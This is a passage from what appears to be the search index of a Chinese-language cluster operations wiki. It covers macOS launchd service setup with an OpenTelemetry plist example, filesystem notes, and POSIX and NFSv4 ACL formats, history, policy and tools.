<li>\u600e\u4e48\u4fdd\u8bc1\u7cfb\u7edf\u670d\u52a1\u7684\u707e\u5907\u548c\u9ad8\u53ef\u7528\uff1f</li> </ul> <p>\u7cfb\u7edf\u8fd0\u7ef4\u6587\u6863\u6bd4\u8f83\u591a\uff0c\u56e0\u4e3a\u6d89\u53ca\u8f6f\u4ef6\u548c\u786c\u4ef6\u4e2d\u5f88\u591a\u57fa\u7840\u3001\u91cd\u8981\u7684\u73af\u8282\u3002</p>"},{"location":"operation/system/#\u96c6\u7fa4\u67b6\u6784\u8bbe\u8ba1","title":"\u96c6\u7fa4\u67b6\u6784\u8bbe\u8ba1","text":"<p>Quote</p> <ul> <li>Bootstrapping an Infrastructure - NASA</li> <li>Plan your installation - FAI</li> </ul> <p>\u5728\u52a8\u624b\u64cd\u4f5c\u4e4b\u524d\uff0c\u5e94\u5f53\u6295\u5165\u4e00\u5b9a\u65f6\u95f4\u8fdb\u884c\u8be6\u7ec6\u7684\u8bbe\u8ba1\u89c4\u5212\u3002\u6bd4\u5982\u53c2\u8003\u6587\u732e\u4e2d\u5c31\u63d0\u51fa\u4e86\u4ee5\u4e0b\u6b65\u9aa4\uff1a</p> <ol> <li>Version Control -- CVS, track who made changes, backout</li> <li>Gold Server -- only require changes in one place</li> <li>Host Install Tools -- install hosts without human intervention</li> <li>Ad Hoc Change Tools -- 'expect', to recover from early or big problems</li> <li>Directory Servers -- DNS, NIS, LDAP</li> <li>Authentication Servers -- NIS, Kerberos</li> <li>Time Synchronization -- NTP</li> <li>Network File Servers -- NFS, AFS, SMB</li> <li>File Replication Servers -- SUP</li> <li>Client File Access -- automount, AMD, autolink</li> <li>Client OS Update -- rc.config, configure, make, cfengine</li> <li>Client Configuration Management -- cfengine, SUP, CVSup</li> <li>Client Application Management -- autosup, autolink</li> <li>Mail -- SMTP</li> <li>Printing -- Linux/SMB to serve both NT and UNIX</li> <li>Monitoring -- syslogd, paging</li> </ol>"},{"location":"operation/system/macOS/","title":"macOS \u8fd0\u7ef4","text":""},{"location":"operation/system/macOS/#macos-\u8fd0\u7ef4","title":"macOS \u8fd0\u7ef4","text":"<p>\u6211\u4eec\u6709\u4e00\u53f0 Mac Mini M4 Pro\uff0c\u5b83\u662f\u4e00\u53f0\u975e\u5e38\u5f3a\u5927\u7684\u670d\u52a1\u5668\u3002\u672c\u6587\u8bb0\u5f55 macOS \u4e0a\u7684\u8fd0\u7ef4\u7ecf\u9a8c\u3002\u5f88\u591a\u8d44\u6599\u6765\u81ea Apple \u5b98\u65b9\u5f00\u53d1\u8005\u7f51\u7ad9\uff1aApple Developer\u3002</p>"},{"location":"operation/system/macOS/#launchd","title":"launchd","text":"<p>Quote</p> <ul> <li>About Daemons and Services - Apple Developer\uff1a\u5b98\u65b9\u6587\u6863\uff0c\u867d\u7136\u662f 2016 \u5e74 OS X \u7684 Archive\uff0c\u4f46\u4f9d\u7136\u5f88\u6709\u53c2\u8003\u4ef7\u503c\u3002</li> <li>macOS launchctl commands \u2013 rakhesh.com\uff1a\u4e00\u4e2a\u7cbe\u7b80\u7684\u5165\u95e8\u6559\u7a0b\uff0c\u5305\u542b launchctl \u547d\u4ee4\u548c\u670d\u52a1\u793a\u4f8b\u3002</li> <li>A launchd Tutorial\uff1a\u4e00\u4e2a\u5b8c\u5584\u7684 launchd \u6559\u7a0b\u3002</li> </ul> <p>launchd \u662f MacOS \u7684\u670d\u52a1\u7ba1\u7406\u5668\uff0c\u7c7b\u4f3c\u4e8e Linux \u7684 systemd\uff08\u5b83\u4eec\u90fd\u662f\u7cfb\u7edf\u542f\u52a8\u65f6\u5185\u6838\u8fd0\u884c\u7684\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\uff09\u3002</p> <ul> <li> <p>luanchd \u670d\u52a1\u5206\u4e3a\u4e24\u7c7b\uff1a</p> \u670d\u52a1\u7c7b\u578b \u63cf\u8ff0 \u76ee\u5f55 Daemon \u7cfb\u7edf\u7ea7\u522b\u7684\u670d\u52a1\uff0c\u4e0d\u9700\u8981\u7528\u6237\u767b\u5f55\u5c31\u53ef\u4ee5\u8fd0\u884c <code>/System/Library/LaunchDaemons</code> \u6216 <code>/Library/LaunchDaemons</code> Agent \u7528\u6237\u670d\u52a1\uff0c\u9700\u8981\u7528\u6237\u767b\u5f55\u624d\u80fd\u8fd0\u884c <code>~/Library/LaunchAgents</code> </li> <li> <p>launchd \u7684\u547d\u4ee4\u884c\u5de5\u5177\u662f <code>launchctl</code>\uff0c\u5e38\u7528\u547d\u4ee4\u6709\uff1a</p> <pre><code>sudo launchtl load /Library/LaunchDaemons/otelcol-contrib.plist\nsudo launchctl start otelcol-contrib\nsudo launchctl list | grep otelcol-contrib\nsudo launchctl stop otelcol-contrib\nsudo launchctl unload /Library/LaunchDaemons/otelcol-contrib.plist\n</code></pre> </li> <li> <p>\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\u662f plist \u683c\u5f0f\u7684\u6587\u4ef6\u3002\u4ee5 OpenTelemetry \u4e3a\u4f8b\uff0c\u914d\u7f6e\u6587\u4ef6\u5982\u4e0b\uff1a</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n&lt;dict&gt;\n        &lt;key&gt;Label&lt;/key&gt;\n        &lt;string&gt;otelcol-contrib&lt;/string&gt;\n        &lt;key&gt;RunAtLoad&lt;/key&gt;\n        &lt;true/&gt;\n        &lt;key&gt;KeepAlive&lt;/key&gt;\n        &lt;true/&gt;\n        &lt;key&gt;Program&lt;/key&gt;\n        &lt;string&gt;/usr/local/bin/otelcol-contrib&lt;/string&gt;\n        &lt;key&gt;ProgramArguments&lt;/key&gt;\n        &lt;array&gt;\n                &lt;string&gt;/usr/local/bin/otelcol-contrib&lt;/string&gt;\n                &lt;string&gt;--config=/etc/otelcol-contrib/config.yaml&lt;/string&gt;\n        &lt;/array&gt;\n        &lt;key&gt;EnvironmentVariables&lt;/key&gt;\n        &lt;dict&gt;\n                &lt;key&gt;OTEL_BEARER_TOKEN&lt;/key&gt;\n                &lt;string&gt;your_key_here&lt;/string&gt;\n                &lt;key&gt;OTEL_CLOUD_REGION&lt;/key&gt;\n                &lt;string&gt;zjusct-cluster&lt;/string&gt;\n        &lt;/dict&gt;\n        &lt;key&gt;StandardOutPath&lt;/key&gt;\n        &lt;string&gt;/var/log/otelcol-contrib.log&lt;/string&gt;\n        &lt;key&gt;StandardErrorPath&lt;/key&gt;\n        &lt;string&gt;/var/log/otelcol-contrib-err.log&lt;/string&gt;\n&lt;/dict&gt;\n&lt;/plist&gt;\n</code></pre> <p>\u5b8c\u6574\u5b9a\u4e49\u89c1 launchd.plist(5) manual page\u3002\u53ef\u4ee5\u4f7f\u7528 <code>plutil</code> \u547d\u4ee4\u68c0\u67e5 plist \u6587\u4ef6\u8bed\u6cd5\u662f\u5426\u6b63\u786e\u3002\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u540e\u9700\u8981 <code>unload</code> \u518d <code>load</code> \u670d\u52a1\u3002</p> </li> <li> <p>\u5176\u4ed6\uff1a</p> <ul> <li>\u914d\u7f6e\u4e3a <code>KeepAlive</code> \u7684\u670d\u52a1\u4f1a\u5c1d\u8bd5\u4fdd\u6301\u8fd0\u884c\uff0c\u4e0d\u7ba1\u662f\u5f02\u5e38\u9000\u51fa\u8fd8\u662f\u624b\u52a8\u505c\u6b62\u90fd\u4f1a\u91cd\u542f\u3002launchctl \u6ca1\u6709 <code>restart</code>\uff0c\u4f46\u5bf9\u4e8e\u8fd9\u6837\u7684\u670d\u52a1 <code>stop</code> \u5c31\u76f8\u5f53\u4e8e <code>restart</code>\u3002</li> </ul> </li> </ul>"},{"location":"operation/system/macOS/#\u6587\u4ef6\u7cfb\u7edf","title":"\u6587\u4ef6\u7cfb\u7edf","text":"<p>Quote</p> <ul> <li>About Files and Directories - Apple Developer</li> </ul> <p>macOS \u7684\u6587\u4ef6\u7cfb\u7edf\u5e03\u5c40\u4e0e UNIX \u6709\u4e00\u4e9b\u663e\u8457\u7684\u4e0d\u540c\uff1a</p> <ul> <li>APFS \u4e0b\uff0c\u6839\u76ee\u5f55\u53ea\u8bfb\uff0c\u65e0\u6cd5\u521b\u5efa\u6587\u4ef6/\u76ee\u5f55\u3002\u53ef\u4ee5\u4f7f\u7528 <code>synthetic.conf</code> \u5c06\u6587\u4ef6\u5939\u6620\u5c04\u5230\u6839\u76ee\u5f55\uff0c\u89c1 finder - Unable to create folder in root of 'Macintosh HD'? - Ask Different\u3002</li> </ul> <p>\u5176\u4ed6\uff1a</p> <ul> <li>\u540c\u6837\u4f7f\u7528 <code>/etc/fstab</code> \u6302\u8f7d NFS\uff0c\u4f46\u53c2\u6570\u6709\u6240\u4e0d\u540c\uff0c\u6bd4\u5982\u4e0d\u652f\u6301 <code>default</code> \u9009\u9879\u3002</li> </ul>"},{"location":"operation/system/macOS/#\u7f51\u7edc","title":"\u7f51\u7edc","text":"<p>Quote</p> <ul> <li>mac network commands cheat sheet</li> </ul>"},{"location":"operation/system/basic/acl/","title":"\u6587\u4ef6\u6743\u9650","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#\u6587\u4ef6\u6743\u9650","title":"\u6587\u4ef6\u6743\u9650","text":"<p>Todo</p> <ul> <li> POSIX \u6587\u4ef6\u6743\u9650</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#acl-\u539f\u7406","title":"ACL \u539f\u7406","text":"<p>POSIX \u57fa\u672c\u6587\u4ef6\u6743\u9650\u65e0\u6cd5\u6ee1\u8db3\u66f4\u7ec6\u7c92\u5ea6\u7684\u6743\u9650\u63a7\u5236\u9700\u6c42\uff0c\u53ef\u4ee5\u4f7f\u7528 ACL\uff08Access Control List\uff09\u6765\u5b9e\u73b0\u66f4\u7ec6\u7c92\u5ea6\u7684\u6743\u9650\u63a7\u5236\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#acl-\u5386\u53f2\u548c\u652f\u6301\u60c5\u51b5","title":"ACL \u5386\u53f2\u548c\u652f\u6301\u60c5\u51b5","text":"\u51e0\u79cd ACL <ul> <li>Classic Unix permissions\uff1a\u7ecf\u5178\u6743\u9650\u3002</li> <li> <p>POSIX ACL\uff1a\u53ea\u5b58\u5728\u8349\u7a3f</p> <p>Unfortunately, it eventually turned out that standardizing all these diverse areas was too ambitious a goal. In January 1998, sponsorship for 1003.1e and 1003.2c was withdrawn. While some parts of the documents produced by the working group until then were already of high quality, the overall works were not ready for publication as standards. It was decided that draft 17, the last version of the documents the working group had produced, should be made available to the public.</p> </li> <li> <p>NFSv4 ACL\uff1a\u6700\u65b0\uff0c\u6709\u660e\u786e\u89c4\u8303\uff0c\u529f\u80fd\u6700\u5f3a\u5927\u7684 ACL</p> <ul> <li>NFSv4 ACL \u4e0e POSIX ACL \u4e0d\u517c\u5bb9\u3002</li> <li>NFSv4.1 ACL \u662f POSIX ACL \u548c Windows NT ACL \u7684\u8d85\u96c6\u3002</li> <li>Ext3\u3001Ext4 \u548c ZFS \u90fd\u652f\u6301 NFSv4 ACL\u3002</li> <li>Mac OS X\u3001FreeBSD \u90fd\u652f\u6301 NFSv4 ACL\u3002</li> <li>Linux \u6682\u672a\u539f\u751f\u652f\u6301 NFSv4 ACL\u3002</li> <li>\u4e0e POSIX ACL \u76f8\u6bd4\uff0c\u5bf9\u7f51\u7edc\u670d\u52a1\u7684\u652f\u6301\u66f4\u597d\uff0c\u6bd4\u5982\u7528\u6237/\u7ec4\u53ef\u4ee5\u4f7f\u7528 <code>user@domain</code> \u683c\u5f0f\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f UID/GID\u3002</li> </ul> </li> </ul> <ul> <li>POSIX ACL \u662f\u76ee\u524d Linux \u548c\u5404\u7c7b\u6587\u4ef6\u7cfb\u7edf\u666e\u904d\u652f\u6301\u7684 ACL \u7c7b\u578b\u3002<code>setfacl</code>\u3001<code>getfacl</code> \u7b49\u5b9e\u7528\u5de5\u5177\u7528\u4e8e\u64cd\u4f5c POSIX ACL\u3002</li> <li> <p>NFSv4 ACL \u5177\u6709\u8bf8\u591a\u4f18\u52bf\uff0c\u4f46\u5728\u53ef\u4ee5\u9884\u89c1\u7684\u672a\u6765\u90fd\u4e0d\u4f1a\u88ab Linux \u4e3b\u7ebf\u5185\u6838\u5408\u5e76\uff0c\u5728 OpenZFS \u4e5f\u5904\u4e8e work in progress \u9636\u6bb5\u3002<code>nfs4_setfacl</code>\u3001<code>nfs4_getfacl</code> \u7b49\u5de5\u5177\u7528\u4e8e\u64cd\u4f5c NFSv4 ACL\u3002</p> <p>\u8fd9\u5728 ACL \u4e0a\u4ea7\u751f\u4e86\u975e\u5e38\u5c34\u5c2c\u7684\u60c5\u51b5\uff1aNFSv4 \u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u5df2\u7ecf\u88ab Linux Kernel \u5e7f\u6cdb\u652f\u6301\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u5fc5\u987b\u91c7\u7528 NFSv4 ACL \u8fdb\u884c\u6c9f\u901a\u3002\u7136\u800c\uff0cLinux Kernel \u4ecd\u7136\u6ca1\u6709\u539f\u751f\u652f\u6301 NFSv4 ACL\uff0c\u4e8e\u662f\u5c31\u5fc5\u987b\u5728 NFS \u670d\u52a1\u7aef\u5c06 NFSv4 ACL \u8f6c\u6362\u4e3a POSIX ACL\u3002\u8fd9\u90e8\u5206\u4ee3\u7801\u53ef\u4ee5\u5728 fs/nfsd/nfs4acl.c \u4e2d\u627e\u5230\u3002</p> <pre><code>             NFSv4 ACL         convert            POSIX ACL\nv4 Client &lt;-----------&gt; Linux Kernel NFS Server &lt;-----------&gt; Filesystem\n</code></pre> </li> </ul> \u5173\u4e8e Linux\u3001OpenZFS \u5bf9 NFSv4 ACL \u7684\u652f\u6301\u60c5\u51b5 <p>\u76ee\u524d\uff0cOpenZFS \u548c Linux Kernel \u4ecd\u65e7\u672a\u63d0\u4f9b\u5bf9 NFSv4 ACL \u7684 Server \u539f\u751f\u652f\u6301\u3002<code>richacl</code> \u5df2\u7ecf\u88ab Fedora \u5305\u542b\uff0c\u4f46 Debian \u4ecd\u672a\u5305\u542b\u3002</p> <p>OpenZFS \u8fdf\u8fdf\u672a\u5b9e\u73b0 NFSv4 ACL \u7684\u539f\u56e0\u662f Linux Kernel \u5bf9 NFSv4 ACL \u7684\u652f\u6301\u4e0d\u8db3\uff1bLinux Kernel \u672a\u5b9e\u73b0 NFSv4 ACL \u7684\u539f\u56e0\u6216\u8bb8\u662f Linux VFS \u7ef4\u62a4\u8005\u8ba4\u4e3a POSIX ACL \u5df2\u7ecf\u8db3\u591f\uff0c\u5408\u5e76 NFSv4 ACL \u5bf9 Linux \u6ca1\u6709\u597d\u5904\u3002</p> <ul> <li>(2023)NFSv4 ACLs on OpenZFS for Linux - TopicBox\uff1aOpenZFS \u5bf9 NFSv4 ACL \u7684\u652f\u6301\u8fdb\u5c55\u3002</li> <li>ACLs - Linux NFS\uff1a\u8ba8\u8bba\u4e86 ACL \u4e0e NFS \u5b9e\u73b0\u95ee\u9898\u548c\u652f\u6301\u60c5\u51b5\u3002</li> <li>(2022)Linux's refusal to adopt RichACLs/NFSv4 ACLs forever perplexes me - Hacker News\uff1a\u5173\u4e8e Linux Kernel \u5bf9 NFSv4 ACL \u7684\u8ba8\u8bba\u3002</li> </ul> <p>Samba Wiki\uff1a</p> <p>Linux is the only one of the major Unix flavors that does not have any native NFS4 ACL support upstream in the kernel yet. There was a proposed implementation called RichACLs. RichACLs are essentially like NFS4 ACLs with the additional feature of file masks. Even though the RichACL implementation was in a good shape in 2015 already, it never was brought upstream into the kernel because some Linux VFS maintainers believe that POSIX draft ACLs are sufficient and NFS4 ACLs don't fit well to Linux. This is a pity for all of the the Linux community actually.</p> <p>\u4e00\u4f4d\u5f00\u53d1\u8005\u7684\u8bc4\u8bba\uff1a</p> <p>My (unofficial) understanding of the linux kernel developers policy is that they will not accept any commits for functionality that is not used by an in-kernel module or component. As zfs is not and presumably never will be an official in-kernel component, any changes specifically to improve or enhance it will not be accepted upstream. For example, once zfs nfsv4 acl support is complete, it would be nice to be able to export them via NFS. However, the current linux NFS server does not support exporting actual nfsv4 ACLs, only mangling POSIX file system ACLs. Adding support to it for nfsv4 filesystem ACLs would not be accepted if it were only for the benefit of zfs. However, there is a possible workaround, at least for that. The NFS server supports re-exporting an NFS client mount. If somebody contributed a change allowing nfsv4 ACLs present on a client NFS mount to be re-exported via the NFS server, that would likely be accepted, and could be made generic enough to magically just work with zfs as well :).</p> <p>Linux NFS \u9875\u9762\uff1a</p> <p>None of the filesystems which the linux server exports support NFSv4 ACLs. However, many of them do support POSIX ACLs. So we map NFSv4 ACLs to POSIX ACLs and store POSIX ACLs in the filesystem. The mapping is imperfect. It accepts most NFSv4 ACLs.</p> <p>The code to perform this mapping on the server side is in the kernel, in fs/nfsd/nfs4acl.c.</p> <p>Work is under way to include NFSv4 ACLs in the underlying filesystem, which would solve all of the above problems at the expense of increased filesystem complexity. As of this writing, patches for production use are not yet available.</p> <ul> <li>The latest progress of Native NFSv4 ACLs on Linux Richacls, and latest Fedora has included richacl package.</li> <li>man-pages in package richacl richacl(7) richaclex(7) getrichacl(1) setrichacl(1)</li> </ul> <p>2019 \u5e74\u5185\u6838 Mailing List \u4e2d\uff1a</p> <p>Is there some reason why there hasn't been a greater effort to add NFSv4 ACL support to the mainstream linux filesystems?  I have to support a hybrid linux/windows environment and not having these ACLs on ext4 is a daily headache for me.</p> <p>The patches for implementing that have been rejected over and over again, and nobody is working on them anymore.</p> <p>\u7ecf\u8fc7\u7814\u7a76\u548c\u6d4b\u8bd5\uff0c\u6211\u4eec\u6700\u7ec8\u91c7\u7528 POSIX ACL\u3002\u542f\u7528 ACL \u7684\u5b58\u50a8\u6c60\u6302\u8f7d\u4e3a NFSv3\uff0c\u4ee5\u4fbf\u5728\u5ba2\u6237\u7aef\u4e0a\u4e5f\u80fd\u76f4\u63a5\u4f7f\u7528 <code>acl</code> \u800c\u4e0d\u662f <code>nfs4-acl-tools</code>\uff0c\u7edf\u4e00\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u7684 ACL \u4f7f\u7528\u4f53\u9a8c\u3002</p> <p>Info</p> <p>TrueNAS \u7b49\u4e13\u6ce8\u5b58\u50a8\u7684\u53d1\u884c\u7248\u5df2\u7ecf\u5b8c\u5584\u652f\u6301\u4e86 NFSv4 ACL\uff0c\u540e\u7eed\u6211\u4eec\u53ef\u80fd\u8003\u8651\u5c06\u5b58\u50a8\u6c60\u79fb\u52a8\u5230 TrueNAS \u4e0a\uff0c\u5347\u7ea7\u5230 NFSv4 ACL\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#acl-\u683c\u5f0f","title":"ACL \u683c\u5f0f","text":"Quote <ul> <li>(2002)POSIX Access Control Lists on Linux - USENIX\uff1aExt2/3 \u7684\u8d21\u732e\u8005\u5199\u7684\uff0c\u8be6\u7ec6\u4ecb\u7ecd\u4e86 POSIX ACL \u7684\u6982\u5ff5\u3001\u4f7f\u7528\u3001\u539f\u7406\u548c\u6027\u80fd\u5206\u6790\uff0c\u5e76\u4e14\u5bf9\u6bd4\u8bb2\u89e3\u4e86\u4e0d\u540c\u7cfb\u7edf\u4e2d\u91c7\u7528\u4e0d\u540c\u8bbe\u8ba1\u7684\u8003\u8651\u3002\u8fd9\u7bc7\u6587\u7ae0\u7684\u540e\u534a\u90e8\u5206\u8fd8\u63a2\u8ba8\u4e86 NFS\u3001Samba \u4e0e ACL\u3002</li> <li>New Solaris ACL Model - Oracel Help Center\uff1a\u63cf\u8ff0\u4e86 NFSv4 \u4e0b\u7684 ACL \u6a21\u578b\u3002</li> </ul> <p>ACL \u7531 ACEs\uff08Access Control Entries\uff09\u7ec4\u6210\u3002\u5f53\u57fa\u672c\u6587\u4ef6\u6743\u9650\u88ab\u66f4\u6539\u65f6\uff0cACL \u4f1a\u88ab\u66f4\u65b0\u3002\u5177\u4f53\u66f4\u65b0\u65b9\u5f0f\u56e0\u5b9e\u73b0\u800c\u5f02\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#posix-ace","title":"POSIX ACE","text":"<p>POSIX ACL \u5177\u6709 6 \u79cd ACE\uff1a</p> Entry type Text form Owner <code>user::rwx</code> Named user <code>user:name:rwx</code> Owning group <code>group::rwx</code> Named group <code>group:name:rwx</code> Mask <code>mask::rwx</code> Others <code>other::rwx</code> <p>\u53ea\u6709 Owner\u3001Owning Group\u3001Others \u7684\u79f0\u4e3a Minimal ACL\uff0c\u76f4\u63a5\u6620\u5c04\u5230\u7ecf\u5178\u6743\u9650\u3002\u542b\u6709\u5176\u4ed6\u7684\u79f0\u4e3a Extended ACL\uff0c\u6620\u5c04\u89c4\u5219\u5982\u4e0b\u56fe\uff1a</p> ACL Mapping <p>\u4f7f\u7528 Extended ACL \u540e\uff0c<code>ls</code> \u663e\u793a\u7684 group \u6743\u9650\u8868\u793a\u53ef\u6388\u4e88\u7684\u6743\u9650\u4e0a\u754c\uff0c\u79f0\u4e3a Masking of Permissions\uff0c\u5982\u4e0a\u56fe\u6240\u793a\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff1a</p> <p>Example</p> <pre><code>user:joe:r-x\nmask::rw-\n</code></pre> <p><code>joe</code> \u7528\u6237\u5bf9\u6587\u4ef6\u7684\u6743\u9650\u4e3a <code>r-x</code>\uff0c\u4f46\u7531\u4e8e <code>mask</code> \u4e3a <code>rw-</code>\uff0c\u6240\u4ee5\u5b9e\u9645\u6743\u9650\u4e3a <code>r-</code>\u3002</p> <p><code>owner</code> \u548c <code>other</code> \u6743\u9650\u4e0d\u53d7 <code>mask</code> \u5f71\u54cd\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#posix-acl","title":"POSIX ACL","text":"<p>POSIX ACL \u5206\u4e3a\u4e24\u79cd\uff1a</p> <ul> <li>Access ACL\uff1a\u63a7\u5236\u6587\u4ef6\u7684\u8bbf\u95ee\u6743\u9650\u3002</li> <li>Default ACL\uff1a\u63a7\u5236\u65b0\u5efa\u6587\u4ef6/\u76ee\u5f55\u7684\u7ee7\u627f\u6743\u9650\u3002</li> </ul> <p>\u53ea\u6709\u76ee\u5f55\u624d\u6709 Default ACL\uff0c\u5bf9\u6587\u4ef6\u6765\u8bf4\u6ca1\u6709\u610f\u4e49\u3002\u5728\u76ee\u5f55\u5185\u65b0\u5efa\u76ee\u5f55\u65f6\uff0c\u7ee7\u627f\u7236\u76ee\u5f55\u7684 Access ACL \u548c Default ACL\uff1b\u65b0\u5efa\u6587\u4ef6\u65f6\uff0c\u7ee7\u627f Default ACL \u4f5c\u4e3a\u81ea\u5df1\u7684 Access ACL\u3002</p> <p>\u5982\u679c\u6709 Default ACL\uff0c\u5219\u65b0\u5efa\u6587\u4ef6/\u6587\u4ef6\u5939\u4e0d\u53d7 <code>umask</code> \u5f71\u54cd\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#nfsv4-acl","title":"NFSv4 ACL","text":"<pre><code>A:d:user@nfsdomain.org:rxtnc\n</code></pre> <ul> <li>ACE Type\uff1a<code>A</code> \u8868\u793a Allow\uff0c<code>D</code> \u8868\u793a Deny\u3002</li> <li> <p>ACE Flags\uff1a\u7528\u4e8e\u63a7\u5236\u7ee7\u627f\uff0c\u4ec5\u7528\u4e8e\u76ee\u5f55\u3002\u5728\u6587\u4ef6\u4e0a\u8bbe\u7f6e\u6ca1\u6709\u610f\u4e49\u3002</p> Flag Name Description <code>d</code> directory-inherit \u5b50\u76ee\u5f55\u7ee7\u627f <code>f</code> file-inherit \u6587\u4ef6\u7ee7\u627f <code>i</code> inherit-only \u4ec5\u7ee7\u627f <code>n</code> no-propagate \u4e0d\u4f20\u64ad </li> <li> <p>ACE Principal\uff1a</p> <ul> <li>\u7528\u6237\u540d\u5b57\uff1a<code>user@nfsdomain.org</code></li> <li>\u7528\u6237\u7ec4\uff1a\u9700\u8981\u5728 Flags \u52a0\u4e0a <code>g</code>\u3002</li> <li>\u7279\u6b8a\uff1a<code>OWNER@</code>\u3001<code>GROUP@</code>\u3001<code>EVERYONE@</code></li> </ul> </li> <li> <p>ACE Permissions\uff1a</p> Permission Function <code>r</code> read-data (files) / list-directory (directories) <code>w</code> write-data (files) / create-file (directories) <code>a</code> append-data (files) / create-subdirectory (directories) <code>x</code> execute (files) / change-directory (directories) <code>d</code> delete the file/directory <code>D</code> delete-child : remove a file or subdirectory from the given directory (directories only) <code>t</code> read the attributes of the file/directory <code>T</code> write the attribute of the file/directory <code>n</code> read the named attributes of the file/directory <code>N</code> write the named attributes of the file/directory <code>c</code> read the file/directory ACL <code>C</code> write the file/directory ACL <code>o</code> change ownership of the file/directory <p>POSIX \u517c\u5bb9\uff1a</p> Permission Function <code>R</code> <code>rntcy</code> <code>W</code> <code>watTNcCy</code> + <code>D</code>\uff08\u6587\u4ef6\u5939\uff09 <code>X</code> <code>xtcy</code> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#acl-\u5b9e\u8df5","title":"ACL \u5b9e\u8df5","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#\u6211\u4eec\u7684-acl-\u7b56\u7565","title":"\u6211\u4eec\u7684 ACL \u7b56\u7565","text":"<p>\u76ee\u524d\uff0c\u53ea\u6709\u516c\u5171\u5b58\u50a8\u6c60\uff08<code>river</code> \u7b49\u533a\u57df\uff09\u4f7f\u7528\u4e86 ACL\u3002\u6211\u4eec\u7684 ACL \u7b56\u7565\u5982\u4e0b\uff1a</p> <ul> <li><code>/river</code><ul> <li>\u5b58\u50a8\u6c60\u6839\u76ee\u5f55\u548c\u7b2c\u4e00\u5c42\u5b50\u76ee\u5f55\uff1a\u5f52\u5c5e <code>root</code>\uff0c\u57fa\u7840\u6743\u9650 <code>755</code>\uff0c\u65e0 ACL\u3002</li> <li>\u7b2c\u4e8c\u5c42\u5f00\u59cb\uff1a\u7531\u7ba1\u7406\u5458\u521b\u5efa\uff0c\u5f52\u5c5e\u4e8e\u67d0\u4e2a\u7528\u6237\u53ca\u9879\u76ee\u7ec4\uff0c\u57fa\u7840\u6743\u9650 <code>770</code>\uff0cACL \u6309\u9700\u8bbe\u7f6e\uff08\u5f53\u57fa\u672c\u7528\u6237/\u7528\u6237\u7ec4\u65e0\u6cd5\u6ee1\u8db3\u6743\u9650\u7ba1\u7406\u9700\u6c42\u65f6\uff09\u3002</li> </ul> </li> <li><code>/lake</code>\uff1a\u6682\u65e0\u8ba1\u5212\u914d\u7f6e\u3002</li> <li><code>/ocean</code>\uff1a\u6682\u65e0\u8ba1\u5212\u914d\u7f6e\u3002</li> <li><code>/home</code>\uff1a\u6682\u65e0\u8ba1\u5212\u914d\u7f6e\u3002</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#acl-\u5de5\u5177","title":"ACL \u5de5\u5177","text":"<p>Quote</p> <ul> <li>HOWTO: Use POSIX ACL - Ohio Supercomputer Center</li> <li>HOWTO: Use NFSv4 ACL - Ohio Supercomputer Center</li> </ul> <p>Debian \u9ed8\u8ba4\u672a\u5b89\u88c5 ACL\u3002\u76ee\u524d APT \u6e90\u4e2d\u6709\u4e24\u79cd ACL \u5de5\u5177\uff1a</p> <ul> <li><code>acl</code>: Commands for Manipulating POSIX Access Control Lists</li> <li><code>nfs4-acl-tools</code>\uff1aClient tools for manipulating NFSv4 ACLs directly</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#acl","title":"<code>acl</code>","text":"<p>\u63a5\u4e0b\u6765\u4ecb\u7ecd\u4f7f\u7528 <code>setfacl</code> \u548c <code>getfacl</code> \u547d\u4ee4\u8bbe\u7f6e\u548c\u67e5\u770b ACL\u3002</p> <p><code>acl</code> \u5305\u8bc6\u522b\u7684 ACL \u683c\u5f0f\u5982\u4e0b\uff08\u6458\u81ea man page\uff09\uff1a</p> <pre><code>ACL ENTRIES\n    The setfacl utility recognizes the following ACL entry formats (blanks inserted for clarity):\n\n    [d[efault]:] [u[ser]:]uid [:perms]\n           Permissions of a named user. Permissions of the file owner if uid is empty.\n\n    [d[efault]:] g[roup]:gid [:perms]\n           Permissions of a named group. Permissions of the owning group if gid is empty.\n\n    [d[efault]:] m[ask][:] [:perms]\n           Effective rights mask\n\n    [d[efault]:] o[ther][:] [:perms]\n           Permissions of others.\n</code></pre> <p>\u6ce8\u610f\u8bbe\u7f6e ACL \u65f6\u5fc5\u987b\u4f7f\u7528 ID \u800c\u4e0d\u80fd\u4f7f\u7528\u7528\u6237\u540d/\u7ec4\u540d\uff0c\u867d\u7136\u663e\u793a\u65f6\u662f\u76f4\u63a5\u663e\u793a\u7528\u6237\u540d/\u7ec4\u540d\u3002</p> <p>\u83b7\u53d6\u7528\u6237/\u7ec4 ID \u7684\u547d\u4ee4\uff1a</p> <pre><code>id -u username\nid -g username\ngetent group groupname | cut -d: -f3\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528 <code>bash</code> \u7684\u53d8\u91cf\u66ff\u6362\u8bed\u6cd5\u65b9\u4fbf\u5730\u8bbe\u7f6e ACL\uff1a</p> <pre><code>setfacl -m u:$(id -u username):rwx file\n</code></pre> <p><code>getfacl</code> 